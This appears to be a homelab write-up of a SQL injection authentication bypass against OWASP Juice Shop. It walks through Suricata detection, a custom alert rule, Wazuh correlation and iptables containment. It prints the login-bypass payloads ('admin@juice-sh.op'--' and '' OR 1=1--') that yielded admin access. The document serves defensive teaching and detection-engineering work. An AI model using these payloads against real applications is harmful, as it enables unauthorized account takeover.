# 03 — Attack Scenario

## Overview

The Ch.04 attack scenario was executed from `h4des` against OWASP Juice Shop on `edge`.

The goal was not only to prove that the vulnerable login could be bypassed, but also to determine whether the existing AEGIS detection pipeline recognized the attack.

---

## Attack 1 — Invalid Login Baseline

A normal invalid login was captured and replayed in Burp Repeater.

```http
POST /rest/user/login HTTP/1.1
Host: 192.168.178.185:3000
Content-Type: application/json
```

Example request body:

```json
{
  "email": "sfsdf",
  "password": "sdfsdfsdfsdf"
}
```

Result:

```text
HTTP/1.1 401 Unauthorized
Invalid email or password.
```

![Invalid login 401](../04-Evidences/01_burp_invalid_login_401.png)

This established the expected baseline: invalid credentials are rejected.

---

## Attack 2 — SQL Injection Authentication Bypass

The email field was modified in Burp Repeater:

```text
admin@juice-sh.op'--
```

The password was intentionally invalid.

Result:

```text
HTTP/1.1 200 OK
```

![SQLi bypass 200](../04-Evidences/02_burp_sqli_bypass_200_redacted.png)

The authentication token is redacted in the public screenshot.

A second payload was also tested successfully during the lab:

```text
' OR 1=1--
```

The key finding is not the exact payload variation but that attacker-controlled input changed the authentication logic and returned a valid administrative session.

---

## Impact — Administration Access

The authenticated session allowed access to the Juice Shop Administration page.

![Administration access](../04-Evidences/03_juice_shop_admin_access.png)

This demonstrated impact beyond a single HTTP 200 response: authentication controls were bypassed and privileged application functionality became accessible.

---

## Detection Question

After confirming the exploit, the focus moved to Suricata:

> Did the IDS detect the SQL injection, or did it only record the HTTP request?

The login request was visible in `eve.json` as HTTP telemetry with:

```text
method: POST
url: /rest/user/login
status: 200
```

but there was no matching SQL-injection alert in the existing ruleset.

This became the Ch.04 detection gap.

---

## Detection Engineering Re-test

A local custom rule was added:

```text
msg:"AEGIS SQLi Login Bypass Attempt"
sid:1000001
```

After Suricata was restarted and the same login bypass was repeated, `eve.json` contained:

```text
event_type: alert
signature_id: 1000001
signature: AEGIS SQLi Login Bypass Attempt
category: Web Application Attack
http_method: POST
url: /rest/user/login
status: 200
```

The same alert then appeared in Wazuh.

---

## Incident Containment

After the successful detection was centrally confirmed, the current attacking host was blocked from Juice Shop:

```bash
sudo iptables -I DOCKER-USER 1 -i wlp3s0 -s 192.168.178.50 -p tcp --dport 3000 -j DROP
```

From Kali:

```text
curl: (28) Connection timed out after 5001 milliseconds
```

From `core`:

```text
HTTP/1.1 200 OK
```

The attacker-specific containment worked without taking the web service offline for another client.

---

*homelab_AEGIS · github.com/cyb-ersin · Ch.04 — Web Application Attack, Detection & Incident Response*
